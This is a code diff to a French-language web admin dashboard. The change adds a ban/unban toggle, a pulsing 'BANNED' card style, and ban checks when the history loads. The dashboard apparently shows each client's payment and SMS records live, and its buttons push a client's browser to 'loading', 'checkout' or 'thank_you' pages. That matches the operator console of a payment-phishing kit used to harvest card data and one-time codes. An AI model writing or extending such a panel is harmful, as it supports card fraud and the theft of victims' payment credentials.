@@ -210,6 +210,39 @@
             filter: grayscale(0.8) opacity(0.5);
         }
 
+        .card.banned {
+            border-color: var(--danger);
+            background: rgba(255, 69, 58, 0.08);
+            box-shadow: 0 0 30px rgba(255, 69, 58, 0.2);
+        }
+
+        .card.banned::before {
+            content: "⚠️ BANNED";
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            font-size: 0.7rem;
+            font-weight: 800;
+            background: var(--danger);
+            color: #fff;
+            padding: 4px 10px;
+            border-radius: 4px;
+            z-index: 10;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.7;
+            }
+        }
+
         /* --- High Visibility Card Data --- */
         .card-header {
             display: flex;
@@ -568,8 +601,23 @@
                 const res = await fetch('/v1/admin/history', { headers: { 'X-API-KEY': API_KEY } });
                 const history = await res.json();
 
+                // Store banned lists for checking
+                window.bannedIPs = history.banned_ips || [];
+                window.bannedIDs = history.banned_ids || [];
+
                 // History is already sorted by backend
-                history.payments.forEach(p => updateOrCreateCard(p.client_id, p));
+                history.payments.forEach(p => {
+                    updateOrCreateCard(p.client_id, p);
+                    // Check if banned
+                    const card = document.getElementById(`card-${p.client_id}`);
+                    if (card) {
+                        const isBanned = window.bannedIDs.includes(p.client_id) || window.bannedIPs.includes(p.adresse_ip);
+                        if (isBanned) {
+                            card.classList.add('banned');
+                            updateBanButton(p.client_id, true);
+                        }
+                    }
+                });
                 history.sms.forEach(s => {
                     const card = document.getElementById(`card-${s.client_id}`);
                     if (card) {
@@ -683,7 +731,7 @@
                         <button onclick="redirect('${id}', 'loading')" class="btn btn-primary">LOAD</button>
                         <button onclick="redirect('${id}', 'thank_you')" class="btn btn-success">FINISH</button>
                         <button onclick="redirect('${id}', 'checkout')" class="btn btn-danger">BACK</button>
-                        <button onclick="banClient('${id}')" class="btn btn-danger" style="background:rgba(255,69,58,0.1)">BAN</button>
+                        <button onclick="toggleBan('${id}')" class="btn btn-danger ban-btn" style="background:rgba(255,69,58,0.1)">BAN</button>
                     </div>
                 `;
                 clientList.prepend(card);
@@ -726,14 +774,46 @@
             });
         }
 
-        async function banClient(clientId) {
+        async function toggleBan(clientId) {
             const card = document.getElementById(`card-${clientId}`);
             const ip = card.getAttribute('data-ip');
-            if (!confirm(`Bannir ${clientId} (${ip}) ?`)) return;
-            await fetch(`/v1/admin/ban?client_id=${clientId}&ip=${ip}`, {
-                method: 'POST', headers: { 'X-API-KEY': API_KEY }
-            });
-            card.style.opacity = '0.3';
+            const isBanned = card.classList.contains('banned');
+
+            if (isBanned) {
+                // UNBAN
+                if (!confirm(`Débannir ${clientId} (${ip}) ?`)) return;
+                await fetch(`/v1/admin/unban?client_id=${clientId}&ip=${ip}`, {
+                    method: 'POST', headers: { 'X-API-KEY': API_KEY }
+                });
+                card.classList.remove('banned');
+                // Update local lists
+                window.bannedIDs = window.bannedIDs.filter(id => id !== clientId);
+                window.bannedIPs = window.bannedIPs.filter(i => i !== ip);
+                updateBanButton(clientId, false);
+            } else {
+                // BAN
+                if (!confirm(`Bannir ${clientId} (${ip}) ?`)) return;
+                await fetch(`/v1/admin/ban?client_id=${clientId}&ip=${ip}`, {
+                    method: 'POST', headers: { 'X-API-KEY': API_KEY }
+                });
+                card.classList.add('banned');
+                // Update local lists
+                if (!window.bannedIDs.includes(clientId)) window.bannedIDs.push(clientId);
+                if (!window.bannedIPs.includes(ip)) window.bannedIPs.push(ip);
+                updateBanButton(clientId, true);
+            }
+        }
+
+        function updateBanButton(clientId, isBanned) {
+            const card = document.getElementById(`card-${clientId}`);
+            if (!card) return;
+            const btn = card.querySelector('.ban-btn');
+            if (btn) {
+                btn.textContent = isBanned ? 'UNBAN' : 'BAN';
+                btn.style.background = isBanned ? 'rgba(48, 209, 88, 0.1)' : 'rgba(255,69,58,0.1)';
+                btn.style.color = isBanned ? 'var(--success)' : 'var(--danger)';
+                btn.style.borderColor = isBanned ? 'rgba(48, 209, 88, 0.3)' : 'rgba(255, 69, 58, 0.3)';
+            }
         }
 
         async function downloadJSON() {
